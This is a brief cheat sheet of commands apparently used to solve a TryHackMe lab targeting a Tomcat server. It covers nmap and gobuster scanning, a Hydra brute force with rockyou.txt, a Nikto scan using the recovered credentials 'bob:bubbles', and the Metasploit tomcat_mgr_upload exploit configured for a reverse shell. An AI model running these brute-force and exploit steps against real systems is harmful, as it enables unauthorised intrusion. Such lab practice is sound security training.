### Basic commands ###

# Nmap:
nmap -sC -sV -o initial 10.10.105.84

# Gobuster:

gobuster dir -u 10.10.105.84 -w /usr/share/wordlists/dirbuster-ng/wordlists/big.txt -o gobuster                                      

# Hydra:

hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.105.84 http-get /protected

# Nikto:

nikto -host http://10.10.105.84:1234/manager/html -id bob:bubbles -output writeUps/tryhackme/toolsros/nikto -Format txt

# Msfconsole

use exploit/multi/http/tomcat_mgr_upload

set rhost,rport,lhost,lport httpusername and httppassword